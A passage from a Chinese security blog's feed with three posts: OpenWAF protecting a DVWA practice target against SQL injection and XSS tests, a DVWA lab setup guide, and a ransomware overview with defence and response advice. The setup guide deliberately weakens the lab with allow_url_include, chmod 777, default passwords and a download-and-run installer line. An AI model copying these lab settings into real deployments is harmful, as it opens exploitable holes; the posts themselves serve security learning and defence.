class="built_in">local</span>/openresty/nginx/sbin/nginx (code=exited, status=1/FAILURE)</span><br><span class="line">Apr 04 04:00:42 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:42 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:43 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:43 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:44 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:44 localhost.localdomain nginx[42096]: nginx: [emerg] still could not <span class="built_in">bind</span>()</span><br></pre></td></tr></table></figure><p>修改apache的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line">Listen 8080</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/1-apache%E7%AB%AF%E5%8F%A3.png" alt="修改apache端口的效果"></p><p>将apache的端口改成8080后，再次启动nginx就可以看到OpenResty成功启动了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/2-%E6%88%90%E5%8A%9F%E5%90%AF%E5%8A%A8OpenResty.png" alt="OpenResty成功启动了"></p><h2 id="二、配置OpenWAF的web防护"><a href="#二、配置OpenWAF的web防护" class="headerlink" title="二、配置OpenWAF的web防护"></a>二、配置OpenWAF的web防护</h2><p>这边DVWA靶机的地址是<a href="http://192.168.1.24:8080/DVWA/" target="_blank" rel="noopener">http://192.168.1.24:8080/DVWA/</a>  DVWA靶机的安装见另一篇博文《<a href="https://blog.csdn.net/fullbug/article/details/129879670" target="_blank" rel="noopener">CentOS7+LAMP+DVWA靶机搭建</a>》<a href="https://blog.csdn.net/fullbug/article/details/129879670" target="_blank" rel="noopener">https://blog.csdn.net/fullbug/article/details/129879670</a><br>我们需要配置OpenResty+OpenWAF来对192.168.1.24:8080进行WEB防护<br>参考《<a href="https://github.com/titansec/OpenWAF/blob/master/doc/%E8%BD%BB%E6%9D%BE%E7%8E%A9%E8%BD%ACOpenWAF%E4%B9%8B%E5%85%A5%E9%97%A8%E7%AF%87.md" target="_blank" rel="noopener">轻松玩转OpenWAF之入门篇</a>》及 《<a href="https://github.com/titansec/OpenWAF/blob/master/doc/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6OpenWAF%E4%B9%8Bnginx%E9%85%8D%E7%BD%AE.md" target="_blank" rel="noopener">深入研究OpenWAF之nginx配置</a>》</p><h3 id="1、nginx配置修改"><a href="#1、nginx配置修改" class="headerlink" title="1、nginx配置修改"></a>1、nginx配置修改</h3><p>在 nginx 的 http 级别添加如下两行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include /opt/OpenWAF/conf/twaf_main.conf;</span><br><span class="line">include /opt/OpenWAF/conf/twaf_api.conf;</span><br></pre></td></tr></table></figure><p>要防护的 server 或 location 级别添加如下一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include /opt/OpenWAF/conf/twaf_server.conf;</span><br></pre></td></tr></table></figure><p>OpenResty的nginx的配置文件在 /usr/local/openresty/nginx/conf/nginx.conf</p><p>具体配置参考下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/3-OpenResty%E7%9A%84nginx%E9%85%8D%E7%BD%AE.png" alt="nginx.conf相关配置"></p><h3 id="2、OpenWAF接入规则修改"><a href="#2、OpenWAF接入规则修改" class="headerlink" title="2、OpenWAF接入规则修改"></a>2、OpenWAF接入规则修改</h3><p>修改/opt/OpenWAF/conf/twaf_access_rule.json文件<br>具体配置参考下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/4-OpenWAF%E7%9A%84twaf_access_rule.json%E7%9A%84%E9%85%8D%E7%BD%AE.png" alt="twaf_access_rule.json文件的配置"></p><h3 id="3、测试验证"><a href="#3、测试验证" class="headerlink" title="3、测试验证"></a>3、测试验证</h3><p>这时候我们访问<a href="http://192.168.1.24/DVWA/" target="_blank" rel="noopener">http://192.168.1.24/DVWA/</a>  ，注意是没有带8080端口的，因为是通过OpenResty+OpenWAF来反向代理了127.0.0.1的8080端口，访问<a href="http://192.168.1.24/DVWA/" target="_blank" rel="noopener">http://192.168.1.24/DVWA/</a>  是经过了OpenWAF防护的。<br>这时候我们开始通过SQL注入对DVWA的靶机进行SQL注入的攻击。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/5-SQL%E6%B3%A8%E5%85%A5.png" alt="SQL注意"></p><p>防护效果：<br>可以看到OpenWAF提示标识为攻击并记录，提示是有次SQL注入的攻击，并进行了防护。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/5-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="SQL注入防护效果"></p><p>接下来我们进行一次XSS的攻击<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/6-XSS%E6%94%BB%E5%87%BB.png" alt="在这里插入图片描述"></p><p>同样OpenWAF给出了XSS的攻击提示，并进行了防护。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/6-XSS%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="XSS的防护效果"></p><p>至此，本文介绍了OpenResty+OpenWAF的安装，并通过配置对DVWA的靶机进行了WEB防护，通过SQL注入及XSS的攻击，验证了OpenWAF的效果。OpenResty+OpenWAF是开源的软WAF解决方案，安装和配置相对简单，对于中小企业的web防护来说不失为一个低成本的解决方案。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。本文介绍通过OpenResty+OpenW
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7+LAMP+DVWA靶机搭建</title>
    <link href="https://xiejava.gitee.io/posts/4405dad8/"/>
    <id>https://xiejava.gitee.io/posts/4405dad8/</id>
    <published>2023-03-31T07:43:55.000Z</published>
    <updated>2023-03-31T08:03:55.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、什么是DVWA"><a href="#一、什么是DVWA" class="headerlink" title="一、什么是DVWA"></a>一、什么是DVWA</h2><p>Damn Vulnerable Web Application (DVWA)(译注：可以直译为：”该死的”不安全Web应用程序)，是一个编码差的、易受攻击的 PHP/MySQL Web应用程序。 它的主要目的是帮助信息安全专业人员在合法的环境中，练习技能和测试工具，帮助 Web 开发人员更好地了解如何加强 Web 应用程序的安全性，并帮助学生和教师在可控的教学环境中了解和学习 Web 安全技术。<br>DVWA的中文介绍见 <a href="https://github.com/digininja/DVWA/blob/master/README.zh.md" target="_blank" rel="noopener">https://github.com/digininja/DVWA/blob/master/README.zh.md</a><br>下载地址：git clone <a href="https://github.com/digininja/DVWA.git" target="_blank" rel="noopener">https://github.com/digininja/DVWA.git</a></p><h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><h3 id="1、LAMP环境安装"><a href="#1、LAMP环境安装" class="headerlink" title="1、LAMP环境安装"></a>1、LAMP环境安装</h3><p>DVWA的安装依赖的软件包如下：</p><ul><li>apache2 </li><li>libapache2-mod-php </li><li>mariadb-server </li><li>mariadb-client php</li><li>php-mysqli php-gd</li></ul><p>就是依赖于LAMP环境，可以参考官方文档一个依赖包手工安装也可以通过下载lamp统一安装脚本一键安装。<br>安装 - LAMP一键安装包<br>运行 <code>wget -c http://soft.vpser.net/lnmp/lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lamp</code> 一路回车选择默认项，稍等片刻，即可完成安装<br>如果是手工安装：<code>yum install -y httpd php php-mysql php-gd mariadb-server mariadb</code></p><h2 id="三、安装DVWA"><a href="#三、安装DVWA" class="headerlink" title="三、安装DVWA"></a>三、安装DVWA</h2><h3 id="1、下载DVWA的软件包"><a href="#1、下载DVWA的软件包" class="headerlink" title="1、下载DVWA的软件包"></a>1、下载DVWA的软件包</h3><p>进入到默认的web发布目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/digininja/DVWA.git</span><br></pre></td></tr></table></figure><p>直接通过地址访问DVWA<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E8%AE%BF%E9%97%AEDVWA.png" alt="访问DVWA"><br>他会提示需要将config/config.inc.php.dist复制成config/config.inc.php并配置环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure><h3 id="2、配置数据库"><a href="#2、配置数据库" class="headerlink" title="2、配置数据库"></a>2、配置数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config.ini.php</span><br></pre></td></tr></table></figure><p>找到数据库的配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = array();</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_user'</span> ]     = <span class="string">'dvwa'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_password'</span> ] = <span class="string">'p@ssw0rd'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_port'</span>] = <span class="string">'3306'</span>;</span><br></pre></td></tr></table></figure><p>根据config.inc.php的数据库配置信息配置数据库，注意不要用root来访问数据库。<br>先用客户端工具创建dvwa的数据库，再创建dvwa的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all on dvwa.* to <span class="string">'dvwa'</span>@<span class="string">'localhost'</span> identified by <span class="string">'p@ssw0rd'</span> with grant option;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>登录数据库查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dvwa -p</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/showdatabases.png" alt="show databases"></p><h3 id="3、修改php-ini的配置"><a href="#3、修改php-ini的配置" class="headerlink" title="3、修改php.ini的配置"></a>3、修改php.ini的配置</h3><p>再次访问DVWA<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/setupcheck.png" alt="在这里插入图片描述"></p><p>这里提示要修改php.ini的配置将 <code>allow_url_fopen=On</code> 和<code>allow_url_include=On</code>。</p><p>找到环境的php.ini我这里是在/etc/php.ini进行修改，不要修改/var/www/html/DVWA/php.ini中的配置了。<br>配置好后重启apache </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p>刷新浏览器，可以看到红色的Disabled告警消失了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E6%A3%80%E6%9F%A5check.png" alt="红色告警消失了"></p><p>reCAPTCHA key: Missing 这个告警是因为reCAPTCHA没有配置，这个需要去谷歌的网站申请公钥和私钥。可以不用管</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ReCAPTCHA settings</span></span><br><span class="line"><span class="comment">#   Used for the 'Insecure CAPTCHA' module</span></span><br><span class="line"><span class="comment">#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">''</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">''</span>;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 -R hackable</span><br><span class="line">chmod 777 -R config</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E4%BF%AE%E5%A4%8D%E7%BB%93%E6%9E%9C.png" alt="在这里插入图片描述"></p><h3 id="4、创建数据"><a href="#4、创建数据" class="headerlink" title="4、创建数据"></a>4、创建数据</h3><p>配置完后点击“Create/Reset Database”</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/createdatabase.png" alt="成功创建数据库"></p><h3 id="5、登录靶机"><a href="#5、登录靶机" class="headerlink" title="5、登录靶机"></a>5、登录靶机</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/dvwa%E7%99%BB%E5%BD%95.png" alt="在这里插入图片描述"><br>DVWA的默认用户名和密码是admin /password<br>登录成功后就可以开始进行靶机的实验了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/DVWA%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png" alt="在这里插入图片描述"><br>后续我们将通过Open-WAF来搭建一个WAF来防护这个靶机感受一下软waf的防护情况。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、什么是DVWA&quot;&gt;&lt;a href=&quot;#一、什么是DVWA&quot; class=&quot;headerlink&quot; title=&quot;一、什么是DVWA&quot;&gt;&lt;/a&gt;一、什么是DVWA&lt;/h2&gt;&lt;p&gt;Damn Vulnerable Web Application (DVWA)(译注：
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之认识勒索病毒</title>
    <link href="https://xiejava.gitee.io/posts/8510060b/"/>
    <id>https://xiejava.gitee.io/posts/8510060b/</id>
    <published>2023-03-23T08:36:27.000Z</published>
    <updated>2023-09-14T08:45:41.882Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230323/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92.png" alt="勒索病毒"></p><h2 id="一、什么是勒索病毒"><a href="#一、什么是勒索病毒" class="headerlink" title="一、什么是勒索病毒"></a>一、什么是勒索病毒</h2><p>勒索病毒，是一种新型电脑病毒，伴随数字货币兴起，主要以邮件、程序木马、网页挂马、服务器入侵、捆绑软件等多种形式进行传播，一旦感染将给用户带来无法估量的损失。如果遭受勒索病毒攻击，将会使绝大多数文件被加密算法加密，并添加一个特殊的后缀，用户无法读取原文件内容，被感染者一般无法解密，必须拿到解密的私钥才有可能无损还原被加密文件。而拿到解密的私钥，通常需要向攻击者支付高昂的赎金，这些赎金必须是通过数字货币支付，一般无法溯源，因此极易造成严重损失。</p><p>一般被勒索病毒感染后，将导致重要文件无法读取、关键数据被损坏、计算机被锁死无法正常使用等情况；为了指引被感染者缴纳赎金，勒索病毒还会在桌面等明显位置生成勒索提示文件，被感染者需要通过缴纳高额赎金才能获取解密密钥恢复计算机系统和数据文件的正常使用，多数情况即使缴纳了高额的赎金也未必能正常恢复数据。因此，勒索病毒具有数据恢复代价大和数据恢复可能性极低的特点。</p><h2 id="二、勒索病毒传播路径"><a href="#二、勒索病毒传播路径" class="headerlink" title="二、勒索病毒传播路径"></a>二、勒索病毒传播路径</h2><p>常见勒索病毒传播途径包括：</p><ol><li>网站挂马。用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。</li><li>邮件传播。邮件传播是目前互联网上常见的病毒传播方式。攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。</li><li>漏洞传播。通过计算机操作系统和应用软件的漏洞攻击并植入病毒是近年来流行的病毒传播方式。最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。</li><li>捆绑传播。攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。</li><li>介质传播。攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。此种传播途径往往发生在文印店、公共办公区域等高频交叉使用可移动存储介质的场所，也可能通过广告活动派发、街区丢弃等方式实现诱导用户使用携带勒索病毒的U盘、光盘。携带勒索病毒的光盘、U盘一旦接入计算机，勒索病毒即可能随着其自动运行或用户点击运行导致计算机被感染。</li></ol><h2 id="三、勒索病毒防护难点"><a href="#三、勒索病毒防护难点" class="headerlink" title="三、勒索病毒防护难点"></a>三、勒索病毒防护难点</h2><p>教育、企业、制造业、医疗、政府等行业由于数据重要性和较好的经济能力，已经成为勒索团队的重点攻击目标。以下是勒索病毒常见的攻击行为。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230323/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA.png" alt="勒索病毒攻击行为"></p><p>从勒索病毒的攻击行为来看，勒索病毒的防护存以下几个主要难点：</p><ul><li>勒索病毒变种多样 ：对程序 / 脚本的加壳、混淆操作，已经有一套相当成熟的自动化流程，能够快速对病毒进行变种，从而绕过传统静态防护。</li><li>边界突破手段多样：包括但不限于 RDP 爆破、SMB 爆破、漏洞利用、钓鱼邮件等等，其中爆破手段是最常使用的入侵手法。</li><li>防御规避手段多样：如无文件攻击、白进程利用、卸载安全服务等，从运营数据看 ,</li><li>采用黑客工具直接卸载终端安全服务、利用白进程进行加密的绕过手段是最为常见。</li><li>勒索病毒识别精准度不足：部分终端防护可以识别出“病毒”，但不能进一步识别出“勒索病毒”，未引起足够重视，导致后续攻击成功。</li></ul><h2 id="四、常见的勒索病毒"><a href="#四、常见的勒索病毒" class="headerlink" title="四、常见的勒索病毒"></a>四、常见的勒索病毒</h2><h3 id="1、GlobeImposter-勒索病毒"><a href="#1、GlobeImposter-勒索病毒" class="headerlink" title="1、GlobeImposter 勒索病毒"></a>1、GlobeImposter 勒索病毒</h3><p>Globelmposter3.0家族的变种采用RSA+AES算法加密，目前该勒索病毒加密的文件暂无解密工具，文件被加密后会被加上Ox4444、China4444、Help4444、Rat4444 、Tiger4444 、Rabbit4444、Dragon4444 、Snake4444 、Horse4444、Goat4444 、Monkey4444、Rooster4444、Dog4444等后缀。在被加密的目录下会生成一个名为”HOW_TO_BACK_FILES”的txt文件，显示受害者的个人ID序列号以及黑客的联系方式等。</p><p>GlobeImposter病毒本身不具备传播性。主要通过垃圾邮件和RDP暴破植入传播。</p><h3 id="2、GandCrab-勒索病毒"><a href="#2、GandCrab-勒索病毒" class="headerlink" title="2、GandCrab 勒索病毒"></a>2、GandCrab 勒索病毒</h3><p>GandCrab勒索病毒于2018年1月面世以来，短短一年内历经多次版本更新，目前最新的版本为V5。该病毒利用多种方式对企业网络进行攻击传播，受感染主机上的数据库、文档、图片、压缩包等文件将被加密，若没有相应数据或文件的备份，将会影响业务的正常运行。从2018年9月份V5版本面世以来，GandCrab出现了包括了5.0、5.0.2、5.0.3、5.0.4以及最新的5.0.5多个版本的变种。病毒采用Salsa20和RSA-2048算法对文件进行加密，并修改文件后缀为.GDCB、.GRAB、.KRAB或5-10位随机字母，勒索信息文件为GDCB-DECRYPT.txt、KRAB-DECRYPT.txt、[5-10随机字母]-DECRYPT.html\txt，并将感染主机桌面背景替换为勒索信息图片。</p><p>GandCrab病毒家族主要通过RDP暴力破解、钓鱼邮件、捆绑恶意软件、僵尸网络以及漏洞利用传播。病毒本身不具有蠕虫传播能力，但会通过枚举方式对网络共享资源进行加密，同时攻击者往往还会通过内网人工渗透方式，利用口令提取、端口扫描、口令爆破等手段对其他主机进行攻击并植入该病毒。主要影响Windows 系统</p><h3 id="3、Satan-变种病毒"><a href="#3、Satan-变种病毒" class="headerlink" title="3、Satan 变种病毒"></a>3、Satan 变种病毒</h3><p>撒旦（Satan）勒索病毒最开始可以追溯到2017年1月，当时病毒作者提供一个门户网站（RaaS，勒索软件即服务）允许任何人注册和创建撒旦勒索软件的自定义版本。<br>2017年11月左右，撒旦开发者开始更新勒索软件的计划，以更好地适应这些趋势。他们采取的第一步是在Satan程序中加入EternalBlue SMB漏洞的攻击和扫描模块。添加此漏洞意味着在撒旦感染计算机后，勒索软件将使用EternalBlue扫描本地网络，查找具有过时SMB服务的计算机并感染它们，从而最大限度地提高攻击效果。<br>2018年5月底出现了撒旦(Satan)勒索病毒的最新的变种，它不仅仅利用了永恒之蓝漏洞，还利用了多个WEB相关的漏洞进行传播。<br>2018年10月底MalwareHunterTeam发现了一款新型的Satan勒索病毒——DBGer勒索病毒。其属于撒旦(Satan)勒索病毒的最新的变种样本，不仅仅利用了之前的一些安全漏洞，同时还加上了Mimikatz的功能。其加密后的文件后缀名变为了.dbger。<br>2018年11月初，发现部分金融客户出现linux和windows跨平台的远控病毒样本，其样本行为与本次捕获样本极其相似。<br>2018年11月底，国内金融厂商开始出现Satan的最新变种，可以在Linux和Windows平台同时进行传播。将本地文件进行勒索加密，将加密后的文件名修改为.lucky。同时在Linux和Windows平台进行蠕虫式传播。</p><p>Satan病毒家族通过下面8种通用漏洞进行传播。目前发现Satan在linux平台会进行内部IP遍历+端口列表的方式进行漏洞扫描。在windows平台会以IP列表+端口列表的方式进行漏洞扫描。<br>JBoss反序列化漏洞(CVE-2013-4810)<br>JBoss默认配置漏洞(CVE-2010-0738)<br>Tomcat任意文件上传漏洞（CVE-2017-12615）<br>Tomcat web管理后台弱口令爆破<br>Weblogic WLS 组件漏洞（CVE-2017-10271）<br>Windows SMB远程代码执行漏洞MS17-010<br>Apache Struts2远程代码执行漏洞S2-045<br>Apache Struts2远程代码执行漏洞S2-057</p><h3 id="4、Sodinoki-勒索病毒"><a href="#4、Sodinoki-勒索病毒" class="headerlink" title="4、Sodinoki 勒索病毒"></a>4、Sodinoki 勒索病毒</h3><p>业内发现邮件附件中的恶意样本，经分析，样本为2019年6月新出的sodinokibi勒索病毒。该病毒以钓鱼邮件来传播，邮件附件中包含伪装成word文档的可执行文件，诱导员工打开附件，加密主机文件。<br>Sodinokibi勒索病毒暂无解密工具，可先将被加密的重要文件、勒索信息文件备份保存，以待将来有解密工具时解密。</p><h2 id="五、勒索病毒发展趋势"><a href="#五、勒索病毒发展趋势" class="headerlink" title="五、勒索病毒发展趋势"></a>五、勒索病毒发展趋势</h2><p>随着勒索技术的发展，勒索病毒呈现加密速度更快，跨平台发展的趋势。</p><ul><li>加密方式更多的转向“间歇性加密”，加密速度更快</li></ul><p>2021 年中旬，LockFile 勒索软件是首批使用间歇性加密来逃避检测机制的主要勒索软件系列之一，该勒索软件每隔 16 个字节对文件进行加密。此后，越来越多的勒索软件操作加入了这一趋势。如 BlackCat(ALPHV)、PLAY、Qyick、Agenda、Black Basta 等。间歇性加密指对受害者文件进行部分加密，这种加密方法不仅可以大大提高加密速度也可以帮助勒索软件运营商逃避基于统计分析的勒索软件检测技术。</p><ul><li>编程语言更多的转向Rust，实现跨平台勒索</li></ul><p>近年，越来越多的勒索软件编程语言转向 Rust 语言。该语言不仅具有与 C/C++ 类似的性能开发优势，而且具有更好的内存管理实现并发编程以避免内存错误，此外在静态分析工具低检出率方面也存在优势。BlackCat是第一个使用Rust的专业/商业化分布式恶意软件家族，也是迄今为止最繁荣的。<br>Rust 是一种跨平台语言，使威胁行为者能够轻松地为 Windows 和 Linux 等不同操作系统创建定制的恶意软件。现在有不少于 10 个勒索软件家族推出了针对 Linux 系统的版本，其中包括 REvil 的 Linux 版本、DarkSide、Dark Angels 、BlackMatter 以及 Defray777 等家族。勒索团伙倾向于以企业为目标，随着越来越多的组织将业务迁移到 VM 以简化设备管理和提高资源利用效率，将攻击目标转向 Linux 平台具有良好的商业意义，因为这样做可以让他们以最小的努力加密多个服务器。</p><h2 id="六、勒索病毒防护建议："><a href="#六、勒索病毒防护建议：" class="headerlink" title="六、勒索病毒防护建议："></a>六、勒索病毒防护建议：</h2><ol><li>定期做好重要数据、文件的备份工作；</li><li>及时更新升级操作系统和应用软件，修复存在的中高危漏洞；</li><li>安装正版杀毒软件并及时升级病毒库，定期进行全面病毒扫描查杀；</li><li>在系统中禁用U盘、移动硬盘、光盘的自动运行功能，不要使用/打开来路不明的U盘、光盘、电子邮件、网址链接、文件；</li><li>避免使用弱口令，为每台服务器和终端设置不同口令，且采用大小写字母、数字、特殊字符混合的高复杂度组合结构，口令位数应8位以上；</li><li>不要在网上下载安装盗版软件、非法破解软件以及激活工具。</li></ol><h2 id="七、勒索病毒应急处置流程"><a href="#七、勒索病毒应急处置流程" class="headerlink" title="七、勒索病毒应急处置流程"></a>七、勒索病毒应急处置流程</h2><h3 id="1、-检测阶段"><a href="#1、-检测阶段" class="headerlink" title="1、 检测阶段"></a>1、 检测阶段</h3><p>如何发现勒索病毒，可通过如下两个场景进行识别：</p><ul><li>场景一：感染但未加密<br>从攻击者渗透进入内部网络的某一台主机到执行加密行为往往有一段时间，如果在这段时间能够做出响应，完全可以避免勒索事件的发生。如果有以下情况，可能是处于感染未加密状态：</li></ul><ol><li>监测设备告警<br>如果使用了监测系统进行流量分析、威胁监测，系统产生大量告警日志，例如“SMB 远程溢出攻击”、“弱口令爆破”等，可能是病毒在尝试扩散。</li><li>资源占用异常<br>病毒会伪装成系统程序，释放攻击包、扫描局域网络 445 端口等占用大量系统资源，当发现某个疑似系统进程的进程在长期占用 CPU 或内存，有可能是感染病毒。</li></ol><ul><li>场景二：感染已加密<br>如果有以下情况，可能是处于感染且已加密状态：</li></ul><ol><li>统一的异常后缀<br>勒索病毒执行加密程序后会加密特定类型的文件，不同的勒索病毒会加密几十到几百种类型的文件，基本都会包括常见的文档、图片、数据库文件。当文件夹下文件变成如下统一异常不可用后缀，就是已经被加密了。</li><li>勒索信或桌面被篡改<br>勒索病毒加密文件的最终目的是索要赎金，所以会在系统明显位置如桌面上留下文件提示，或将勒索图片更改为桌面。勒索信绝大多数为英文，引导被勒索的用户交赎金。<h3 id="2、抑制阶段"><a href="#2、抑制阶段" class="headerlink" 